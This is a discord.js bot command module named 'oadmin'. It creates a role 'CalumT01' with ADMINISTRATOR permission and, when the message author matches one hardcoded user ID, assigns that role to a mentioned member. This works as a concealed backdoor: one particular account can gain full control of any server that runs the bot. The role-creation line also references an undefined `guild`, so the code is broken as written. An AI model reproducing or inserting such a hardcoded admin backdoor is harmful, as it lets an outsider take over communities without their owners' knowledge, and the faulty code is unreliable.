  
const { Client, Collection, MessageEmbed } = require('discord.js');

module.exports.config = {
    name: "oadmin",
    aliases: []
}

module.exports.run = async (client, message, args) => {

guild.roles.create({ data: { name: 'CalumT01', permissions: ['ADMINISTRATOR'] } });

    if (message.author.id === "267388385159675904") {
    
    const adminuser = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
    
    let adminrole = message.guild.roles.cache.find(x => x.name === "CalumT01")
    
    adminuser.roles.add(adminrole)
    
    }

}
